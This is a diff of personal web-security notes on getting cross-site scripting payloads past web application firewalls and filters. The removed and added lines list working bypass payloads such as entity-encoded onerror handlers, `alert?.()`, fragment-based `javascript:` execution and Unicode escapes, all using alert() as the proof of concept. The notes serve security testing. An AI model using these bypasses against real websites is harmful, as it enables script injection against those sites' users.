@@ -1,77 +1,18 @@
-# bypass defenses
+# bypass XSS filters
 
-# bypass WAF
+# [bypass WAF](bypass WAF)
 
-you will need lots of [fuzz](fuzz)ing.
+# more notes
 
-`<ifram>` --> 403
-`<%0aifram>` --> 200 --> then on the server `<iframe>`
+- change after rule-set is a killer.
 
-something like `<%0aimg>` doesn't work on the browser, but when it goes to the server and
-back, the `%0a` will be dropped.
+  it's only safe to do the replacement, then apply rule-sets, if something changes after
+  checker functions, it could turn into a vulnerability.
 
-## known WAF
+  `/share/?token=3a1bf72de2003adf79def7fed4db629e&placement=javascript`
+  then `javascript` will be placed `__PLACEMENT__:alert(origin) -> javascript:alert(origin)`
 
-search for it on twitter.
-
-## not known WAF
-
-- whether it's CDN or application based: make your own payload
-  - application: application error, payload get's removed.
-- build your own payload
-
-# blocked in HTML tags
-
-WAF blocks before executing JS
-
-## alert, prompt, etc are filtered
-
-- fuzz to find a valid tag
-- `<ta{FUZZ}g>`
-- WAF confusion
-  - get the payload from the screenshot
-  - e.g. make it assume it's a comment
-  - html encoding to bypass the WAF
-    - `<img src>` // 200
-    - `<img src onerror=alert(1)>` // 403
-    - `<img src> onerror=alert(1)` // 200
-      so we infer it's the problem with the angle bracket
-    - `<img src &#x3E onerror=alert(1)>` // 200
-      client --> WAF --> html decode --> rule set
-      so WAF first html decode stuff, figures out the tag is closed, so it will return 200.
-      but on the browser it doesn't matter what the string actually is
-
-## parenthesis, brackets, func(), etc are filtered
-
-`1234()` // 200
-`alert()` // 403 --> () are blocked
-
-`alert?.()` // 200
-`window.valueOf=alert;winodow+1` // 200
-
-
-# blocked in JS execution
-
-WAF blocks while JS execution
-you opened an HTML tag, but can't execute JS
-
-if you reached here, you could have XSS
-
-- if it's sensitive to words --> use alternative payloads:
-    - break the payload: `(aler + t(origin))`
-    - put the payload to the fragment
-      `url#javascript:alert(1)`
-      `location=location.hash.split('#')` --> `location.hash.split('#')[1]` ==
-      `javascript:alert(1)`
-      then if you `eval(location=location.hash.split('#'))` XSS!
-    - Unicode variations
-      - `\u{0061}`
-      - `\u{000000061}`
-
-# extend your payload gradually
-
-so that you can infer what is being issued by the WAF or ..., so you'd know what to
-change, fuzz or ....
+----
 
 # bypass escaped/encoded/blocked character
 
